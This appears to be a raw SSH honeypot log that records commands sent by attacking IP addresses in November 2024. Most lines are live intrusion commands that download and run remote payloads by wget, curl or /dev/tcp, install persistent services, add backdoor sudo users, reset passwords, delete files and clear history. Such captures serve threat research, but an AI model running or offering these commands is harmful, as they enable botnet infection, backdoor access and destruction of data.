start
2024-11-19 20:47:48.246951 - ('87.120.113.231', 35844) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi
2024-11-21 21:14:04.021999 - ('195.178.110.34', 48722) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-21 23:41:36.397892 - ('109.235.65.35', 57140) - /ip cloud print
2024-11-21 23:41:36.659442 - ('109.235.65.35', 57140) - ifconfig
2024-11-21 23:41:36.796316 - ('109.235.65.35', 57140) - uname -a
2024-11-21 23:41:36.938374 - ('109.235.65.35', 57140) - cat /proc/cpuinfo
2024-11-21 23:41:37.080718 - ('109.235.65.35', 57140) - ps | grep '[Mm]iner'
2024-11-21 23:41:37.220611 - ('109.235.65.35', 57140) - ps -ef | grep '[Mm]iner'
2024-11-21 23:41:37.356384 - ('109.235.65.35', 57140) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-21 23:41:37.496876 - ('109.235.65.35', 57140) - echo Hi | cat -n
2024-11-22 01:00:03.428115 - ('195.178.110.6', 53222) - apt
2024-11-22 01:00:03.645285 - ('195.178.110.6', 53222) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:04.002294 - ('195.178.110.6', 53236) - apt
2024-11-22 01:00:04.199767 - ('195.178.110.6', 53236) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:04.530045 - ('195.178.110.6', 53242) - apt
2024-11-22 01:00:04.728962 - ('195.178.110.6', 53242) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:05.057903 - ('195.178.110.6', 53248) - apt
2024-11-22 01:00:05.240816 - ('195.178.110.6', 53248) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:05.682109 - ('195.178.110.6', 53258) - apt
2024-11-22 01:00:05.924907 - ('195.178.110.6', 53258) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:06.400355 - ('195.178.110.6', 53266) - apt
2024-11-22 01:00:06.604765 - ('195.178.110.6', 53266) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:06.984330 - ('195.178.110.6', 53270) - apt
2024-11-22 01:00:07.181148 - ('195.178.110.6', 53270) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:07.504898 - ('195.178.110.6', 53272) - apt
2024-11-22 01:00:07.700439 - ('195.178.110.6', 53272) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:08.042785 - ('195.178.110.6', 53274) - apt
2024-11-22 01:00:08.245509 - ('195.178.110.6', 53274) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:08.607279 - ('195.178.110.6', 53278) - apt
2024-11-22 01:00:08.800385 - ('195.178.110.6', 53278) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:09.130815 - ('195.178.110.6', 53280) - apt
2024-11-22 01:00:09.308931 - ('195.178.110.6', 53280) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:09.689276 - ('195.178.110.6', 53294) - apt
2024-11-22 01:00:09.880935 - ('195.178.110.6', 53294) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:10.277375 - ('195.178.110.6', 53308) - apt
2024-11-22 01:00:10.500292 - ('195.178.110.6', 53308) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:10.925908 - ('195.178.110.6', 53318) - apt
2024-11-22 01:00:11.106204 - ('195.178.110.6', 53318) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:11.578917 - ('195.178.110.6', 53322) - apt
2024-11-22 01:00:11.780022 - ('195.178.110.6', 53322) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:12.204046 - ('195.178.110.6', 53326) - apt
2024-11-22 01:00:12.400459 - ('195.178.110.6', 53326) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 01:00:12.777752 - ('195.178.110.6', 53342) - apt
2024-11-22 01:00:12.980217 - ('195.178.110.6', 53342) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-22 03:41:02.258137 - ('46.19.143.66', 41230) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 vhqJ6yn5) system && sudo usermod -aG sudo system
2024-11-22 03:41:02.561666 - ('46.19.143.66', 41230) - lscpu && echo -e "vhqJ6yn5\nvhqJ6yn5" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-22 06:29:27.045517 - ('37.44.238.68', 50334) - whoami
2024-11-22 06:29:30.298232 - ('37.44.238.68', 50380) - whoami
2024-11-22 06:29:32.317463 - ('37.44.238.68', 50368) - whoami
2024-11-22 06:29:34.688569 - ('37.44.238.68', 50372) - whoami
2024-11-22 06:29:36.284318 - ('37.44.238.68', 50370) - whoami
2024-11-22 06:29:38.227097 - ('37.44.238.68', 50396) - whoami
2024-11-22 06:29:41.721513 - ('37.44.238.68', 50358) - whoami
2024-11-22 06:29:44.064050 - ('37.44.238.68', 50350) - whoami
2024-11-22 06:29:46.141566 - ('37.44.238.68', 50468) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:29:47.869760 - ('37.44.238.68', 57806) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:29:49.808843 - ('37.44.238.68', 57810) - whoami
2024-11-22 06:29:51.996985 - ('37.44.238.68', 57904) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:29:54.890011 - ('37.44.238.68', 57888) - whoami
2024-11-22 06:29:56.940520 - ('37.44.238.68', 57942) - whoami
2024-11-22 06:29:59.848426 - ('37.44.238.68', 57970) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:01.973684 - ('37.44.238.68', 58026) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:04.650761 - ('37.44.238.68', 58032) - whoami
2024-11-22 06:30:06.476864 - ('37.44.238.68', 58110) - whoami
2024-11-22 06:30:09.151950 - ('37.44.238.68', 58118) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:11.908624 - ('37.44.238.68', 40532) - whoami
2024-11-22 06:30:14.729660 - ('37.44.238.68', 40536) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:16.164639 - ('37.44.238.68', 40546) - whoami
2024-11-22 06:30:17.558764 - ('37.44.238.68', 40562) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:21.450643 - ('37.44.238.68', 40570) - whoami
2024-11-22 06:30:23.326375 - ('37.44.238.68', 58576) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:25.385083 - ('37.44.238.68', 58586) - whoami
2024-11-22 06:30:27.577727 - ('37.44.238.68', 58594) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:29.773695 - ('37.44.238.68', 58610) - whoami
2024-11-22 06:30:31.409438 - ('37.44.238.68', 58614) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:35.247213 - ('37.44.238.68', 45354) - whoami
2024-11-22 06:30:37.273438 - ('37.44.238.68', 45484) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:39.217034 - ('37.44.238.68', 45570) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:40.812376 - ('37.44.238.68', 45578) - whoami
2024-11-22 06:30:42.273892 - ('37.44.238.68', 43054) - whoami
2024-11-22 06:30:43.884502 - ('37.44.238.68', 43062) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:46.570456 - ('37.44.238.68', 43074) - whoami
2024-11-22 06:30:49.423237 - ('37.44.238.68', 43078) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:51.082551 - ('37.44.238.68', 43090) - whoami
2024-11-22 06:30:52.948573 - ('37.44.238.68', 48738) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:54.809387 - ('37.44.238.68', 48786) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:56.875973 - ('37.44.238.68', 39016) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:30:59.617880 - ('37.44.238.68', 39066) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:31:01.541854 - ('37.44.238.68', 53746) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:31:03.321470 - ('37.44.238.68', 53758) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:31:05.038733 - ('37.44.238.68', 53768) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://87.120.125.191/bins.sh; curl -O http://87.120.125.191/bins.sh;/bin/busybox wget http://87.120.125.191/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 06:31:07.654677 - ('37.44.238.68', 43306) - cd /tmp;rm -rf /tmp/* || cd /var/run || cd /mnt || cd /root;rm -rf /root/* || cd /; wget http://216.126.231.240/bins.sh; curl -O http://216.126.231.240/bins.sh;/bin/busybox wget http://216.126.231.240/bins.sh; chmod 777 bins.sh;./bins.sh;sh bins.sh; rm bins.sh
2024-11-22 07:31:15.495732 - ('46.19.143.66', 58822) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 mHHsHjZz) system && sudo usermod -aG sudo system
2024-11-22 07:31:15.733310 - ('46.19.143.66', 58822) - lscpu && echo -e "mHHsHjZz\nmHHsHjZz" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-23 15:44:11.387984 - ('218.92.0.132', 40590) - #!/bin/sh
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
wget http://43.249.172.195:888/112
curl -O http://43.249.172.195:888/112
chmod +x 112
./112
wget http://43.249.172.195:888/112s
curl -O http://43.249.172.195:888/112s
chmod +x 112s
./112s
rm -rf 112.sh
rm -rf 112
rm -rf 112s
history -c

2024-11-23 15:44:13.054876 - ('218.92.0.132', 40590) - ls -la /var/run/gcc.pid
2024-11-23 22:48:00.662005 - ('46.19.143.66', 48576) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 puA3aPmt) system && sudo usermod -aG sudo system
2024-11-23 22:48:00.909252 - ('46.19.143.66', 48576) - lscpu && echo -e "puA3aPmt\npuA3aPmt" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-24 01:05:46.162917 - ('87.120.113.231', 36408) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-24 02:27:02.904154 - ('45.148.10.203', 51078) - apt
2024-11-24 02:27:03.084730 - ('45.148.10.203', 51078) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:03.384958 - ('45.148.10.203', 51082) - apt
2024-11-24 02:27:03.564858 - ('45.148.10.203', 51082) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:03.873493 - ('45.148.10.203', 51100) - apt
2024-11-24 02:27:04.048861 - ('45.148.10.203', 51100) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:04.353493 - ('45.148.10.203', 51104) - apt
2024-11-24 02:27:04.529137 - ('45.148.10.203', 51104) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:04.833345 - ('45.148.10.203', 59992) - apt
2024-11-24 02:27:05.009075 - ('45.148.10.203', 59992) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:05.316590 - ('45.148.10.203', 59996) - apt
2024-11-24 02:27:05.492958 - ('45.148.10.203', 59996) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:05.796232 - ('45.148.10.203', 60012) - apt
2024-11-24 02:27:05.977097 - ('45.148.10.203', 60012) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:06.280024 - ('45.148.10.203', 60022) - apt
2024-11-24 02:27:06.465072 - ('45.148.10.203', 60022) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:06.768045 - ('45.148.10.203', 60038) - apt
2024-11-24 02:27:06.949036 - ('45.148.10.203', 60038) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:07.252080 - ('45.148.10.203', 60052) - apt
2024-11-24 02:27:07.433082 - ('45.148.10.203', 60052) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:07.737245 - ('45.148.10.203', 60064) - apt
2024-11-24 02:27:07.913193 - ('45.148.10.203', 60064) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:08.222571 - ('45.148.10.203', 60066) - apt
2024-11-24 02:27:08.403534 - ('45.148.10.203', 60066) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:08.707670 - ('45.148.10.203', 60080) - apt
2024-11-24 02:27:08.892880 - ('45.148.10.203', 60080) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-24 02:27:09.200124 - ('45.148.10.203', 60092) - apt
